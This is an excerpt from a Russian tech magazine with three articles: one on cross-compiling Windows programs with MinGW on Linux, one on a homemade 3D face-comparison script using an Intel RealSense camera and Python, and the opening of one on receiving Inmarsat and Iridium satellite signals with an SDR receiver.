у среднего пользователя эта система вряд ли уста новлена и у нативных при‐
ложений возможностей для интегра ции с Windows все равно больше.
  Во многих случаях камень преткновения — не сам код программы, а сис‐
тема сборки. Если ты используешь кросс‐платформенные библиотеки и не
вызываешь специфичные функции POSIX, портирование может вообще
не требоваться. Главное — соб рать исполняемые файлы.
  Сборка‐то обычно и зависит от окружения POSIX. Если ты используешь
GNU autotools, то скрипт ./configure у тебя на Bourne shell. CMake и ряд
других систем сборки умеют генерировать скрип ты под целевую ОС, но оста‐
ется последняя «маленькая» проблема — нужна проприетарная и не бесплат‐
ная ОС. Есть вариант перело жить задачу ее раз вертывания и лицензирова‐
ния на кого‐то другого и обратиться к сервису вроде Appveyor... Но можно
вместо этого восполь зоваться способностью GCC  к кросс‐компиляции
и собирать программы на хосте с Linux (или macOS).


GNU И WINDOWS
Для сборки программ с помощью GNU toolchain на Windows часто используют
два проекта: Cygwin и MinGW + MSYS. У них схожие цели, но разные детали
реализации. Давай разбирать ся.


Cygwin
Cygwin — самая полная реализация окружения GNU для Windows. Он пре дос‐
тавляет большую часть POSIX API в виде биб лиотеки, что позволяет собирать
программы из UNIX без портирова ния, если толь ко им не тре буется семан‐
тика UNIX. Яркий пример — демоны, им нужен fork() и сигналы, которых нет
в Windows, да и службы Windows устроены совсем иначе.
  Кроме библиотеки, дистрибутив содержит набор классических команд
UNIX и терминал. Реализации команд используют эту биб лиотеку и поддержи‐
вают некоторые возможности UNIX, такие как регистрозави симые имена фай‐
лов.
  Целевой способ использования: если нет желания или возможности пор‐
тировать программу на Windows или использовать только платформенно
независимые  API, ее можно собрать «под Cygwin», ценой зависи мости
от cygwin1.dll и относитель ной изоляции от всей остальной системы.
  Многие люди ставили и про должают ставить окру жение Cygwin, чтобы
иметь возможность использовать классичес кие команды UNIX на Windows.
Некоторые разработчики также включают Cygwin в инструкции для сборки
своих программ под Windows, хотя сама прог рамма не связывается с cyg‐
win1.dll. Для этой цели может быть более пра вильно использовать MSYS.


MinGW и MSYS
Если цель Cygwin — сделать воз можной сборку немодифицированных при‐
ложений на Windows ценой внешней зависимости, то цель MinGW + MSYS —
производить приложения без внешних зависимостей.
  MinGW и MSYS — это независимые пакеты, но их час то путают и смешива‐
ют друг с другом (а часто путают и с Cygwin). Можно сказать, что MinGW —
это эквивалент GCC и binutils, а MSYS — расширенный эквивалент coreutils.
   Начнем с MSYS. MSYS — это более «нативная» и легковес ная альтер‐
натива Cygwin. Этот пакет включает биб лиотеку с реализациями функций
POSIX, но она предназна чена для внутреннего поль зования, и авторы катего‐
рически не рекомендуют свя зывать с ней свои при ложения.
  Библиотека MSYS не реализует UNIX поверх Windows, а следует сог‐
лашениям Windows — к примеру, соз нательно не учи тывает регистр букв
в путях к файлам. Главная цель MSYS — предоставить нужные для скриптов
сборки программы вроде Bourne shell, make и прочее, что обычно требуется
для autotools.
  MinGW содержит версии GCC и binutils (ассемблер as, компоновщик ld
и так далее), которые производят исполня емые фай лы для Windows в фор‐
мате PE/COFF. Здесь мы и подходим к ключево му моменту: MinGW, как и все
остальные части GNU toolchain, такой же платформенно независимый проект.
   Кросс‐компиляция в GNU toolchain уже давно обычное дело, и в GCC
целевая платформа и хост независимы друг от дру га. Можно запускать GCC
на Linux для x86 и собирать программы для Linux на ARM, или наоборот. Сов‐
падать не обязаны не только рабочая и целевая архитектуры процессора.
Точно так же не обязаны совпадать даже ОС и формат исполняемого файла.


СТАВИМ MINGW
Авторы многих дистрибутивов GNU/Linux уже пос тарались за нас, так что мно‐
гие кросс‐версии GCC, вклю чая MinGW, можно пос тавить из репозитори ев.
  Например, в Fedora:


$ sudo dnf install mingw32‐gcc
$ sudo dnf install mingw64‐gcc

Или в Debian:


$ sudo apt‐get install gcc‐mingw‐w64‐i686
$ sudo apt‐get install gcc‐mingw‐w64‐x86‐64

Если ты используешь macOS, то MinGW можно поставить из Homebrew: brew
install mingw‐w64.


             INFO

                    MinGW‐w64, несмотря на название, поддержи‐
                        вает и Win32, и Win64. Это форк MinGW, который
                       создали в первую очередь для реализации недос‐
                    тающей  в  оригинальном  проекте  поддержки
                       Win64, отсюда и название.


В Fedora также присутству ет ряд готовых кросс‐версий популярных биб‐
лиотек, например mingw32‐qt.


HELLO WORLD
Для демонстрации соберем традиционный hello world. У кросс‐версий GCC
всегда есть префикс, для MinGW используются префиксы i686‐w64‐mingw32
и x86_64‐w64‐mingw32.


$ cat ./hello.c
#include <stdio.h>


int main(void){
  printf("hello world\n");
}


$ i686‐w64‐mingw32‐gcc ‐o hello32 ./hello.c
$ file ./hello32.exe
./hello32.exe: PE32 executable (console) Intel 80386, for MS Windows

Тестирование кросс‐компилированных программ для других архитектур —
непростая задача, но, пос кольку наша целевая платформа — Windows на x86,
мы легко можем протес тировать их в Wine:


$ wine 2>/dev/null ./hello32.exe
hello world


$ x86_64‐w64‐mingw32‐gcc ‐o hello64 ./hello.c
$ file ./hello64.exe
./hello64.exe: PE32+ executable (console) x86‐64, for MS Windows


$ wine64 2>/dev/null ./hello64.exe
hello world

Такие же префиксы используют прог раммы из binutils. Например, чтобы уда‐
лить отладочные символы из нашего фай ла, мы должны использовать
не strip (который на Linux по умолчанию, очевидно, работает с файлами ELF,
а не PE/COFF), а x86_64‐w64‐mingw32‐strip:


$ x86_64‐w64‐mingw32‐strip ./hello64.exe
$ file ./hello64.exe
./hello64.exe: PE32+ executable (console) x86‐64 (stripped to
external PDB), for MS Windows


ДОБАВЛЯЕМ РЕСУРСЫ
Какое приложение для Windows обходится без значка? В мире UNIX такое
делается с помощью внешних файлов, но в Windows более популярны встро‐
енные в исполняемый файл ресурсы.
   Возьмем какой‐нибудь файл в формате ICO (назовем его icon.ico)
и посмотрим, как встроить его в приложение.
  В состав MinGW входит компилятор ресурсов windres. Поскольку ресурсы
компилируются в объектные файлы PE/COFF, как и все прочие инстру менты,
он существует в 32‐ и 64‐разрядных версиях: i686‐w64‐mingw32‐windres
и x68_64‐w64‐mingw32‐windres.
 1. Создать файл ресурса  (*.rc ) вручную в текстовом редакторе или с
  помощью редактора ресурсов.
 2. Скомпилировать его в PE/COFF с помощью windres.
 3. Скомпилировать саму прог рамму gcc c .
 4. Скомпоновать готовый исполняемый файл.

По шагам для 32‐разрядной версии:


$ cat ./icon.rc
id ICON "icon.ico"


$ i686‐w64‐mingw32‐windres ‐o icon_resource.o ./icon.rc
$ i686‐w64‐mingw32‐gcc ‐c ‐o hello32.o ./hello.c
$ i686‐w64‐mingw32‐gcc  ‐o hello32 ./hello32.o ./icon_resource.o

Если скопировать hello32.exe на Windows или просмотреть его в wine ex‐
plorer.exe, можно убедиться, что у него теперь есть значок.


РЕАЛИСТИЧНЫЕ ПРИМЕРЫ
На практике от игрушечного примера из одного файла мало пользы. В качес‐
тве реалистичного примера с autotools возь мем GNU hello.
   Скрипт ./configure, соз дава емый autotools, поддерживает опцию ‐‐
host, что сильно упрощает дело. В этой опции нуж но указать пре фикс архи‐
тектуры, в нашем случае i686‐w64‐mingw32 для 32‐разрядной версии
или x86_64‐w64‐mingw32, и make автоматически добавит этот пре фикс
ко всем задействованным инстру ментам (GCC, ld...).
   Чтобы пока не затрагивать установку кросс‐версии gettext, отключим
поддержку интернациона лизации с помощью ‐‐disable‐nls и запус тим
сборку:


$ ./configure ‐‐host=i686‐w64‐mingw32 ‐‐disable‐nls
$ make
$ wine 2>/dev/null ./hello.exe
Hello, world!

GNU hello — это все еще игрушка, пусть и сложно устроенная. Соберем
теперь полезную программу — обра бот чик Markdown cmark.
   Здесь процедуры немного сложнее. На момент написания этой статьи
авторы использовали cmake и захардко дили там нес тандартное имя исполня‐
емого файла MinGW.
  Однако если пой ти в toolchain‐mingw32.cmake и поменять все i586‐ming‐
w32msvc на i686‐w64‐mingw32, то make mingw отлично сработает:


$ sed ‐i 's/i586‐mingw32msvc/i686‐w64‐mingw32/g' toolchain‐mingw32.
cmake
$ make mingw
$ echo "**bold text**" | wine 2>/dev/null build‐mingw/windows/bin/
cmark.exe
<p><strong>bold text</strong></p>


ЗАКЛЮЧЕНИЕ
Как видишь, сделать программу дос тупной пользовате лям Windows впол не
реально, даже если ты сам предпочитаешь обхо дить Windows стороной.
Единственный недостаток — придется собирать все библиоте ки, если авторы
репозиториев пакетов для твоей ОС их не предос тавляют.
  Проект MXE предлагает скрипты сборки для популярных библиотек и в
целом делает процедуру кросс‐компиляции про ще. Как лучше организовать
сборку — зависит от твоего приложения, но основы тебе теперь известны, и с
деталями ты сможешь разоб рать ся сам.
GEEK

    НЕ СМОТРИ
     В КАМЕРУ!
            ПИШЕМ СВОЮ СИСТЕМУ
                РАСПОЗНАВАНИЯ ЛИЦ
                         НА PYTHON





                                                                       Михаил Киреев
                                                                                          kireevmp@yandex.ru





В Гонконге протестующие уничтожа ют уличные камеры, что‐
бы избежать рас позна вания лиц. Неужели эта технология
уже настолько эффективна, что с ней нужно бороть ся? Я
купил камеру с датчиком глубины, что бы попробовать самос‐
тоятельно реализовать алгоритм срав нения лиц. Вот что
у меня получилось.


ЗАЧЕМ НУЖНА АУТЕНТИФИКАЦИЯ ПО ЛИЦУ
Существует несколь ко вариантов аутентификации с помощью биометрии,
и каждый из них имеет свои недос татки.
 1. Идентификация по отпечатку пальца. Об этом способе я писал в статье
   «Волшебные «пальчики». Как работают механизмы биометричес кой авто‐
   ризации по  отпечатку  пальца».  Главный  недостаток идентификации
   по отпечатку пальца — сравнитель но небольшая точность. Отпе чаток
   пальца легко подделать, особенно если сканер слабый.
 2. Отпечаток голоса. Наш голос можно раз бить на множество уникальных
   характеристик. Подробнее об этом ты можешь узнать в статье «Машинный
   слух. Как работает идентифика ция человека по его голосу». Но и этот
   метод весьма неточен: из‐за болезни или курения уни кальные характерис‐
   тики голоса могут измениться, и твой девайс тебя уже не узнает.
 3. Сканеры сетчатки и радужки глаза. Они используют сложные алгоритмы
   и дорогостоящие громоздкие приборы для ска нирования. В среднем
   надежность таких аппа ратов выше, чем у более простых в реализации
   устройств. Но и стоимость таких ска неров соответству ющая: базовые
  модели продаются по цене от пятнадца ти тысяч рублей.
 4. Идентификация по трехмерному изоб ражению лица. Этот метод становит‐
   ся все популярнее из‐за выгодного соот ношения цены и качес тва. 3D‐
  камеры работают в разном диапа зоне дальности, поэтому системы рас‐
   познавания и идентификации лица могут быть незаметными и не тре‐
   бовать никаких действий от человека. Точность анализа поверхности лица
   высока, так что все зависит только от разрешения камеры.


КАМЕРА
Я выбрал недорогую, но при этом функциональ ную камеру Intel RealSense
SR305, которая может снимать и цвет ное изображение, и глу бинное изоб‐
ражение в разрешении 640 на 480 пикселей с час тотой до 60 кадров в секун‐
ду.
   Чтобы получать трехмерное изображение, камера использует маленький
инфракрасный излучатель, который про ецирует равномерные линии на пред‐
меты перед ней. По искривлению этих линий камера понимает, насколько
далеко или близко находятся эти объекты.





              Так выглядит камера, установленная на треногу

Рабочее расстояние камеры небольшое: излу чатель расположен так, что
объекты, которые находятся ближе двадцати сантиметров, не будут осве‐
щены и, соответственно, не будут прос канированы. Слишком далеко рас‐
положенные предметы — дальше двух метров — тоже окажутся не вид ны,
поскольку мощность лазера не позволит спроецировать на них инфрак‐
расную сетку.
  В комплекте с камерой идет провод USB и инструкция со ссылкой на офи‐
циальный SDK в репозитории на GitHub.


УСТАНОВКА SDK
В первую очередь нуж но уста новить программное обеспечение, чтобы
камера заработала. Пользователи Windows могут просто скачать и уста‐
новить программу. Если же у тебя Linux, но не Ubuntu 16 или 18, то придется
собирать проект самостоятельно.
  Для начала скачаем исходный код и подготовим площадку для сборки.


$ git clone https://github.com/IntelRealSense/librealsense.git
$ cd librealsense
$ mkdir build && cd build

Теперь можно собрать про ект, что бы посмотреть, как работает камера.


$ cmake .. ‐DBUILD_EXAMPLES=true ‐DBUILD_WITH_OPENMP=false ‐DHWM_O
VER_XU=false
$ make ‐j4
$ make install


       macOSЗапуск в
Если ты пользователь macOS, для запус ка гра фических программ тебе при‐
дется использовать Xcode и соответс твующий флаг при конфигурации. Так ты
сможешь сгенерировать проект Xcode, чтобы запус тить каждую утилиту
по отдельности.


 $ cmake .. ‐DBUILD_EXAMPLES=true ‐DBUILD_WITH_OPENMP=false ‐DHWM_O
 VER_XU=false ‐G Xcode
 $ open librealsense2.xcodeproj


Откроется окно Xcode. Выбери необходимую прог рамму, собери проект ком‐
бинацией клавиш Command + B и нажми кнопку Build and run.





             Окно Xcode с файлами сборки для macOS



Для пробного запуска нам понадобит ся утилита RealSense Viewer, которая
показывает на экране, что видит камера.





        Таким будет окно RealSense Viewer, если подключить камеру





             Пример но так выглядит трансляция глубины


        WWW

                     На GitHub ты можешь найти подробную инструк‐
                   цию по сборке для Linux и для macOS.



ПОДКЛЮЧАЕМ PYTHON
Мы попробуем написать свою программу для идентификации по трехмерно‐
му изображению лица. И для начала нам нуж но подключить библиоте ку Re‐
alSense, например к Python 3. Пользователям Windows и некоторых дистри‐
бутивов Linux не придется напрягать ся — можно взять офи циальный пакет
pyrealsense2 в PyPI.


$ pip install pyrealsense2

Остальных же ждет еще одно приключение: необходимо пересобрать весь
проект, добавив во флаги враппер для Python.


$ cmake .. ‐DBUILD_EXAMPLES=true ‐DBUILD_WITH_OPENMP=false ‐DHWM_O
VER_XU=false ‐DPYTHON_EXECUTABLE=/usr/bin/python3 ‐DBUILD_PYTHON_B
INDINGS:bool=true
$ make ‐j4

В папке wrappers/python/ появятся два фай ла и четыре символичес кие
ссылки. Чтобы исполь зовать эти файлы как биб лиотеку для Python, их необ‐
ходимо скопировать в папку, из которой ты будешь запускать скрипты.



                Так выглядят файлы модуля для Python 3.7

Давай подключим камеру, запустим сканирование и попробуем сделать трех‐
мерную фотографию.


import pyrealsense2 as rs  # Импортируем библиотеки
import numpy as np
import matplotlib.pyplot as plt


pipeline = rs.pipeline()  # Создаем объект, который передает нам
новые кадры
config = rs.config()  # Получаем объект конфигурации
config.enable_stream(rs.stream.depth, 640, 480, rs.format.z16, 30)
# Настраиваем получение кадров глубины в разрешении 640 на 480 и 30
раз в секунду


pipeline.start(config)  # Запускаем поток


try:
    frames = pipeline.wait_for_frames()  # Ждем первого кадра
    depth_frame = frames.get_depth_frame()  # Получаем изображение
глубины


    depth_image = np.asanyarray(depth_frame.get_data())  #
Преобразуем изображение в двумерный массив чисел


    plt.imshow(depth_image, cmap='magma')  # Рисуем изображение на
экране
    plt.show()
finally:
    pipeline.stop()  # Останавливаем камеру





                   Результат выполнения скрипта


        WWW

                   Документацию  библиотеки   pyrealsense2  ты
                    можешь найти на GitHub Pages. Документация
                      не шибко подробная, но отве ты на основные воп‐
                     росы о фун кциональности най ти здесь можно.



ДЕЛАЕМ ТРЕХМЕРНЫЕ МОДЕЛИ ЛИЦА
Чтобы идентифицировать человека по лицу, нам нужно получать форму этого
лица. Самый удоб ный для дальнейшей обра бот ки трехмерной модели лица
формат — облако точек.
   Точки, которые образуют обла ко, — это своеоб разные трехмерные пик‐
сели: они показывают, где находится граница объ екта в трехмерном прос‐
транстве.
   Чтобы получить трехмерное обла ко, в биб лиотеке pyrealsense2 есть спе‐
циальный класс pointcloud, который из кадра глубины создает массив
из координат.


import pyrealsense2 as rs


pc = rs.pointcloud()  # Настраиваем облако точек
pipeline = rs.pipeline()


config = rs.config()
config.enable_stream(rs.stream.depth, 640, 480, rs.format.z16, 30)


pipeline.start(config)



try:
    frames = pipeline.wait_for_frames()


    depth_frame = frames.get_depth_frame()
    depth_intrinsics = depth_frame.profile.as_video_stream_profile().
intrinsics
    # Получаем внутренние характеристики кадра


    w, h = depth_intrinsics.width, depth_intrinsics.height
    # высоту и ширину кадра


    points = pc.calculate(depth_frame)  # Вычисляем положение точек
в облаке
    points.export_to_ply('cloud.ply', color_frame)  # Сохраняем
точки в файл
finally:
    pipeline.stop()

Этот скрипт создает трехмерную фотографию, а мы сохраня ем ее в формате
PLY в виде массива всех координат.
  Для визуализации нашего обла ка точек вос пользуемся библиотекой
open3d из PyPI.


import open3d as o3d


pcd = o3d.io.read_point_cloud("cloud.ply")
o3d.visualization.draw_geometries([pcd])





                       Так выглядит облако точек





                  А вот так — с дру гого ракурса

Можно заметить, что лицо отбра сывает «тень» на стену позади. Поэтому мы
модифицируем наш скрипт: используем математику и выбросим все точки,
которые лежат дальше 35 см от камеры.


import pyrealsense2 as rs
import numpy as np
import open3d as o3d


pc = rs.pointcloud()
pipeline = rs.pipeline()


config = rs.config()
config.enable_stream(rs.stream.depth, 640, 480, rs.format.z16, 30)


pipeline.start(config)


try:
    frames = pipeline.wait_for_frames()


    depth_frame = frames.get_depth_frame()
    depth_intrinsics = depth_frame.profile.as_video_stream_profile().
intrinsics
    w, h = depth_intrinsics.width, depth_intrinsics.height


    points = pc.calculate(depth_frame)


    vts = np.asanyarray(points.get_vertices(2))  # Получаем массив
координат точек
    vts = vts[np.where(vts[:, 2] < 0.35)]  # Убираем все, что дальше
35 см


    pcd = o3d.geometry.PointCloud()  # Создаем облако open3d
    pcd.points = o3d.utility.Vector3dVector(vts)  # Наполняем его
точками
    o3d.visualization.draw_geometries([pcd])  # Рисуем
    o3d.io.write_point_cloud("cloud_filtered.ply", pcd)  # Сохраняем
в файл
finally:
    pipeline.stop()





           В итоге получа ется вот такое трехмерное лицо





                   С дру гого ракурса


СРАВНЕНИЕ ЛИЦ
Для сравнения двух лиц мы выполним несколько шагов.
 1. Найдем «центр масс» для каждого облака, а затем совместим их.
 2. Для каждой точки из первого облака найдем ближайшую точку из второго
   облака и расстояние между ними просуммиру ем.

Попробуем написать такой алгоритм.


import open3d as o3d
import numpy as np


# Загрузим облака
pca = o3d.io.read_point_cloud("cloud_1.ply")
pcb = o3d.io.read_point_cloud("cloud_2.ply")


# Уберем все лишние данные (не считанные камерой точки [0, 0, 0])
points_a = np.asarray(pca.points)
points_a = points_a[points_a.nonzero()[0]]


points_b = np.asarray(pcb.points)
points_b = points_b[points_b.nonzero()[0]]


# Посчитаем центр каждого облака
center = center_a = np.mean(points_a.swapaxes(0, 1), axis=‐1)
center_b = np.mean(points_b.swapaxes(0, 1), axis=‐1)


center_diff = center_b ‐ center_a


# Совместим центры облаков
points_b ‐= np.array([center_diff]).repeat(len(points_b), axis=0)


diff = 0


# Для каждой точки в первом облаке ищем ближайшую точку и сравниваем
со вторым облаком
for point_a in points_a:
    diff += (np.abs(points_b ‐ point_a)).min()


print(diff)

Для разных лиц я получил результат в 0,289807649630209541, а для одинако‐
вых — 0,056304771423558416. Разница зна чительная, а значит, идентифика‐
ция весьма точная.





          Два снимка лица, использовавшихся для сравнения


        WWW

                     Для сравнения облаков есть открытая программа
                      CloudCompare, которая может не только отоб‐
                        разить облака для визуального сравнения, но и
                       посчитать рассто яние между ними.



ВЫВОДЫ
Как видишь, технология аутентифика ции по трехмерному изображению лица
очень действенная и не требует замысловатых алгоритмов. Для работы
понадобится только небольшая специализированная камера и немного сме‐
калки.
   Сканирование лица — один из самых безопас ных способов идентифика‐
ции, поскольку подделать лицо дру гого человека целиком очень и очень
сложно. К тому же боль шинс тво 3D‐камер имеют встроенный цветовой сен‐
сор, позволяющий анализировать и обычную цветную картинку одновремен‐
но с трехмерным изоб ражением.
GEEK
ЗЕМЛЯ
СЛУШАЕТ

ПРИНИМАЕМ
И ДЕКОДИРУЕМ
СИГНАЛЫ СПУТНИКОВ
INMARSAT И IRIDIUM





      DmitrySpb79
     IoT/Python Developer
    dmitryelj@gmail.com





Сегодня я покажу, как принимать и декодировать сигналы
из космоса. Не так, конечно, как это делают контактеры
и любители шапочек из фольги, а на полном серьезе. Мы
будем изучать так называ емый L‐Band — диапазон частот
от 1 до 2 ГГц, который активно используется для коммуника‐
ции со спутниками.


Прием диапазона L‐Band не является для ради олюбите лей чем‐то кар‐
динально новым. Но раньше это было неп росто. Нужно было рассчитать
и сделать антенну, спаять малошу мящий усилитель (потому что сигналы
со спутника очень слабы), потом нас троить все это. К тому же при боры
для этого занятия стоят немалых денег.
  Сейчас все стало гораздо проще и дешевле: можно уложиться в 100 дол‐
ларов за антенну вместе с приемником. Что касается самих спутников, то мы
рассмотрим две системы: Iridium и Inmarsat. Они интерес ны тем, что это дей‐
ствующие системы связи и можно «вживую» пос мотреть, как они работают.
Более того, для этих систем есть программные декодеры, которые можно
запустить, изучить исходники на GitHub.


ЖЕЛЕЗО
Комплект для приема спутниковых сиг налов сос тоит из трех основных ком‐
понентов: приемника, антенны и малошу мяще го усилите ля (LNA, Low Noise
Ampliﬁer).


Приемник
Начнем с приемника. Есть три основных вари анта.


Вариант 1 — RTL-SDR V3
Это уже классика жанра, один из лучших и про веренных недорогих при емни‐
ков на базе известного RTL‐SDR. Приемник обеспечивает работу на частотах
до 1,7 ГГц и ширину полосы обзора 2 МГц. Цена приемника около 30 дол‐
ларов вместе с антенной и мини‐шта тивом (он тоже в хозяйстве пригодится).





                          RTL‐SDR V3

Важно взять именно оригинальную модель: на AliExpress есть более дешевые
клоны, но, во‐первых, их качес тво не гарантируется, во‐вторых, в приемнике
обязательно должна быть воз можность подавать питание на антенный вход
(bias tee), иначе ничего не зарабо тает.


Вариант 2: Nooelec NESDR SMArTee v2
Этот приемник примерно сопос тавим по характерис тикам с предыдущим, он
имеет неотклю чаемый bias tee, и для приема спутников это может быть удоб‐
но. Желательно выбрать именно вторую версию, потому что у первой меньше
максимальный отдаваемый ток (250 мА против 100). Это важно: некоторые
LNA (например, Nooelec SAWbird) пот ребляют порядка 180 мА.





                    NESDR SMArTee v2

Есть и другая модель Nooelec NESDR SMArt, без Tee в названии, она
не подойдет.


Вариант 3 — SDRplay RSPduo
Это более качественный приемник, который обес печивает ширину полосы
приема до 8 МГц, что гораз до удобнее для поис ка сигналов. Сам АЦП также
имеет большую разрядность (12 бит вмес то 8), что лучше для приема слабых
сигналов.





                          SDRplay RSPduo

У RSPduo несколько антенных входов, и он может принимать сигналы от 2 кГц
до 2 ГГц. Цена его, впрочем, уже около 250 долларов.


Ан тенна
Антенны  бывают  разные,  для  наших  целей  лучше  всего  подходят
патч‐антенны  и  парабо лические  антенны. Среди  самодельных  антенн
популярны спиральные: их довольно легко смастерить в домашних условиях.
Некоторые используют переделанную антенну от GPS, из которой удаляют
полосовой фильтр. В общем, вариантов много. Из того, что можно прос то
взять и купить без «доработки напиль ником», мож но порекомендовать ком‐
плект RTL‐SDR Active L‐Band 1525–1637 Patch Antenna Set.





                     RTL‐SDR Patch Antenna

Это уже готовая антенна со встроенным усилителем, для начала работы дос‐
таточно подключить ее к приемнику и активировать в нас тройках bias tee, что‐
бы на антенну было подано питание. Цена антенны — 35 долларов.
   Хорошие результаты дает параболичес кая антенна для  Wi‐Fi, но она
довольно громоздкая.





               Направленная параболичес кая антенна

Хоть эта антенна по документации предназна чена для диапазона 2,4 ГГц, но и
на 1,7 ГГц она работает хорошо. В ней нет встро енного LNA, его придется
докупить отдельно.
  Выбор для начинающего любителя спутниково го приема довольно прост:
приемник RTL‐SDR V3 за 30 долларов и RTL‐SDR Patch Antenna за 35 дол‐
ларов. Подключаем все это к ПК и можем принимать радиосигналы. Все
обойдется в 65 дол ларов. Еще за пять баксов можно прикупить удлинитель
SMA и трехметровый кабель USB: они пригодятся, если антенна и приемник
расположены далеко от компь ютера.
  А если тебе захочется принимать более слабые сигналы, сетап можно
проапгрейдить и поставить антенну побольше, тут предела совершенс тву нет.
  Я все тестировал на таком вот комплекте.





                     Антенна + SDR‐при емник

На этом мы закончим с железом и перейдем к софту. Я не буду рассказывать,
как подклю чить RTL‐SDR к компь ютеру и как уста новить SDR# с плагинами,
статей про это было достаточно, в том числе писали и в «Хакере» («Делаем
первые шаги с RTL‐SDR»).
  Для приема Inmarsat нужно будет уста новить Virtual Audio Cable, чтобы
можно было передавать звук из SDR# в программу‐декодер. Для декоди‐
рования Iridium мы будем использовать Ubuntu из Windows 10.


ОБЩАЯ ИНФОРМАЦИЯ
Какие сигналы мы вооб ще собира емся принимать?
   Inmarsat — это британская компания, которая использует группировку
из  тринадцати  геостационарных  спутников,  расположенных  на  орби‐
те 35 786 км. Спутники геос тационарные, то есть они вращаются синхронно
с Землей. Для приема их сигнала знать точное время пролета не нужно: они
всегда на одном месте относительно поверхности Земли (в отличие от спут‐
ников NOAA).
  Компания Inmarsat предос тавляет разные сервисы передачи данных, тек‐
стовых сообщений, телефо нии. Это актуально там, где нет «обычного» пок‐
рытия, — в авиации, на фло те. Подробнее можно посмотреть на официаль‐
ном сайте. Часть данных шифруется, часть передается в открытом виде.





                        Покрытие Inmarsat

Как видишь, зоной приема охва чена фактически вся поверхность Земли.
Однако геостационарные спутники рас положены над экватором, и на самых
северных широтах прием может быть затруднен.
  Американская компания Iridium использует другой подход: 66 спутников
летают на низкой орбите — 781 км над поверхностью Земли, количес тво
спутников рассчитано так, чтобы в любой момент над каждой точкой было
как минимум три спутника.





                         Покрытие Iridium

Чем больше уровень сигнала со спут ника, тем лучше связь в северных
широтах, зато и стоимость обслуживания спутниковой группировки, веро‐
ятно, выше. Как и Inmarsat, Iridium предос тавля ет сервисы передачи данных,
сообщений и голоса.
  На этом мы закончим с теорией и перейдем к практике: посмотрим, какие
декодеры доступны для обеих систем.


           WARNING

                    Обе системы связи действующие и используются
                        в том числе и в России. Так что статью УК РФ 138
                     «Нарушение   тайны   переписки,  телефонных
                       переговоров, почтовых, телеграфных или иных
                      сообщений» ник то не отменял. Принимать и ана‐
                       лизировать  какие‐либо радиосигналы не  зап‐
                      рещено, но публикация или хранение декоди‐
                       рован ных  сообщений  может  преследоваться
                      по закону. Также из юридических соображений я
                      не буду писать здесь кон кретные значения час‐
                            тот, хотя, в общем‐то, это не сек рет и находится
                        в интернете за пять минут.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
     ЗЕМЛЯ СЛУШАЕТ
                    ПРИНИМАЕМ И ДЕКОДИРУЕМ
           СИГНАЛЫ СПУТНИКОВ INMARSAT И IRIDIUM





ПРИЕМ СИГНАЛОВ INMARSAT
Как ты помнишь, спутники компании Inmarsat геос тационарные. Поэтому пер‐
вым делом ищем направление на спут ник, для чего можно воспользоваться
сайтом dishpointer.com. Выбираем свое местоположение, находим один
из спутников Inmarsat и получа ем угол и высоту спутника, куда нужно будет
направить антенну.





                  Пример скриншота DishPointer

Я пробовал разные прог раммы для Android, но не подошла ни одна из них —
некоторые обвешаны рекламой, во многих есть только спутники для ТВ,
но нет поддержки Inmarsat. В ито ге сайт DishPointer оказался самым удобным
решением. Кстати, для приема желательно открытое небо: если спутник зак‐
рыт домами, то сигнала может не быть.
  Затем подключаем приемник RTL‐SDR с антенной и вводим команду
rtl_biast ‐d 0 ‐b 1 для подачи напряжения на антенный выход RTL‐SDR.
Без подачи питания антенна не зарабо тает.
   Теперь можно запус кать софт. Частоты нес ложно найти самостоятельно.
Если все было сделано пра виль но, то, когда ты направишь антенну в небо, ты
увидишь на экране SDR# сигналы спутников.


Scytale-C
Для начала мы рассмот рим плагин для SDR#, который создал человек
с ником Scytalec. Scytale‐C поз воляет декоди ровать сообщения, которые
были переданы через спутники Inmarsat. Прог рамма состоит из двух частей:
самого плагина, который устанавлива ется в SDR#, и отдельного декодера
QuickUI.
  Плагин Scytale‐C должен быть активен и при пра вильной нас тройке будет
показывать статус Locked и фазовое созвездие BPSK.





                    Прием сигналов в SDR#

Теперь запускаем Quick‐UI, программа может показывать как содержимое
пакетов в JSON, так и декодированные сообщения.





              Декодирова ние сооб щений в Quick‐UI


JAERO
Вторая полезная программа — JAERO. Она ориентирована на прием сооб‐
щений ACARS  (Aircraft Communications Addressing and Reporting System),
которые предназначены для воздушных судов и передаются через спутники
Inmarsat.
  JAERO работает через Virtual Audio Cable, так что в настройках SDR# нуж‐
но будет указать соот ветству ющее устройство для вывода звука. Для приема
сообщений нужно выбрать сигнал в JAERO, при нормальном декодировании
должно появиться фазовое соз вездие QPSK, как показано на рисунке.





               Декодирова ние сооб щений в JAERO

JAERO позволяет декодировать раз ные сигналы, не только текстовые, но и
голосовые. Желающие могут изучить воз можнос ти программы самостоятель‐
но.
  На этом мы закончим с Inmarsat и перейдем к при ему сигналов Iridium.


ПРИЕМ СИГНАЛОВ IRIDIUM
Прием Iridium — немного более муд реная тема, формат самих сигналов
гораздо сложнее. Спутники Iridium переда ют сигналы в виде коротких пакетов
на различных частотах, для наглядности можно показать скриншот приемника
SDRplay с шириной полосы 4 МГц.





                          Сиг налы Iridium

Сложность приема Iridium для большинс тва пользователей состоит в том, что
декодер gr‐iridium можно скомпилировать только в Linux. Мы воспользуем‐
ся тем, что в Windows 10 штатно мож но уста новить Ubuntu из Microsoft Store.
Сам декодер работает из командной строки, так что перед его запуском
целесообразно посмотреть спектр с помощью SDR# и запомнить частоту,
на которой видно больше всего сигналов.
  Другая сложность: ширина полосы спектра, в которой передаются сиг‐
налы Iridium, превышает 2 МГц, предоставляемые RTL‐SDR. Так что часть
пакетов мы неизбежно пропус тим. В идеале нам нужен более широкополос‐
ный приемник, например SDRplay или HackRF. Но мы все же пос мотрим,
как это работает с RTL‐SDR.
  Для этого нужно совершить несколько дей ствий.
   1. Запустим Ubuntu, скомпилируем и установим нужные компоненты.
Декодер Iridium состоит из двух отдельных компонентов — gr‐iridium и iridium‐
toolkit. Инструкция по компиляции и установке есть на странице GitHub.
   2. Активиру ем bias tee в Windows командой rtl_biast ‐d 0 ‐b 1.
Проблема Ubuntu в Windows 10 в том, что Linux не видит подключенных
по USB устройств и запустить приемник напрямую мы не можем. Поэтому мы
запустим в Windows сервер rtl_tcp командой rtl_tcp.exe ‐a 0.0.0.0 ‐f
16XXXXXXXX, где XXX — нужная нам час тота.
   3. Соз дадим в Ubuntu файл rtl_tcp.conf в папке gr‐iridium/exam‐
ples со следующим содержанием.


[osmosdr‐source]
sample_rate=2000000
